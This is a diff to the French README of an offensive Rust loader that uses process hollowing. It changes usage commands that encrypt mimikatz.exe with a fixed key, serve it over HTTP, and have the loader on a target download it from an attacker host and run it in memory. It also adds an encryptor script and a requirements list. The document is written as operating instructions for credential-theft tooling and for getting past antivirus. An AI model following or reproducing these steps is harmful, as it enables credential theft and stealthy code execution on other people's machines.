@@ -10,10 +10,10 @@ Loader offensif basé sur la technique de **Local Hollowing** en Rust. Remplace 
 
 ```powershell
 # Chiffrer un payload
-python ..\CLR\ loading\encrypt.py C:\tools\mimikatz.exe "Hollow3r!2026" -o build
+python encrypt.py C:\tools\mimikatz.exe "Hollow3r!2026" -o payload
 
 # Servir le payload
-python -m http.server 8080 --directory build
+cd payload && python -m http.server 8080
 
 # Exécuter sur la cible
 .\build\mtool_rust.exe http://<IP>:8080/mimikatz.bin "Hollow3r!2026"
@@ -74,6 +74,7 @@ rustc rust_loader/src/main.rs -O --edition 2021 -o build/mtool_rust.exe
 ```
 local-hollowing/
 ├── build_rust.ps1           # Script de build
+├── encrypt.py               # Payload encryptor (AES-256-CBC)
 ├── rust_loader/
 │   └── src/
 │       └── main.rs          # Source complète (download, decrypt, RunPE)
@@ -103,6 +104,13 @@ local-hollowing/
 - **x64 uniquement**
 - Certains vieux binaires (JuicyPotato 2018) crashent à cause d'incompatibilités CRT
 - Payloads sans relocation table (`/FIXED`) peuvent échouer
+
+---
+
+## Requirements
+
+- **Rust** (`rustc` dans le PATH) pour la compilation
+- **Python 3** + `pycryptodome` (`pip install pycryptodome`) pour le chiffrement
 
 ---
 
